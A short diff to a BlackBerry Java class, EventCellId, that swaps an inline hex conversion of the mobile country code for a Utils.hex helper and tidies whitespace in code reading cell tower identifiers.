@@ -18,6 +18,7 @@ import blackberry.config.ConfEvent;
 import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.utils.Utils;
 
 /**
  * The Class CellIdEvent.
@@ -45,18 +46,18 @@ public final class EventCellId extends Event {
             mncOrig = conf.getInt("network");
             lacOrig = conf.getInt("area");
             cidOrig = conf.getInt("id");
-    
+
             //#ifdef DEBUG
-                debug.trace(" Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: " + lacOrig + " Cid: " + cidOrig);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+            debug.trace(" Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: " + lacOrig + " Cid: " + cidOrig);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
             //#endif
-    
+
             setPeriod(CELLID_PERIOD);
             setDelay(CELLID_DELAY);
-    
+
         } catch (final ConfigurationException e) {
             return false;
         }
-    
+
         return true;
     }
 
@@ -76,8 +77,7 @@ public final class EventCellId extends Event {
 
             final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
 
-            mcc = Integer.parseInt(Integer.toHexString((RadioInfo
-                    .getMCC(RadioInfo.getCurrentNetworkIndex()))));
+            mcc = Utils.hex(RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex()));
             mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());
 
             lac = cellinfo.getLAC();
@@ -151,7 +151,7 @@ public final class EventCellId extends Event {
             }
         }
     }
-    
+
     public void actualStop() {
         onExit(); // di sicurezza
     }
